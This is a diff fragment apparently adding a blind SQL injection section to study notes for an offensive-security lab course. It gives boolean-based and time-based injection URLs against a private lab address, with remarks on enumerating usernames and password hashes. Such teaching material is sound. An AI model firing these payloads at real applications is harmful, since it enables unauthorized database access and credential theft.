@@ -1650,3 +1650,20 @@ retrieve the columns table from the `information_schema database` belonging to t
 ```
 ![image](https://hackmd.io/_uploads/SkugTUV7ke.png)
 > fetch the usernames and **MD5 hashes** of the entire users table
+
+#### - Blind SQL Injections
+database responses are never returned and behavior is inferred using either boolean- or time-based logic            
+            
+![image](https://hackmd.io/_uploads/HkXdOvNQyl.png)
+> the application takes a user parameter as input
+            
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+```           
+> enumerate the entire database for other usernames or even extend our SQL query to verify data in other tables
+
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+```
+> the application hangs for about three seconds.
+            
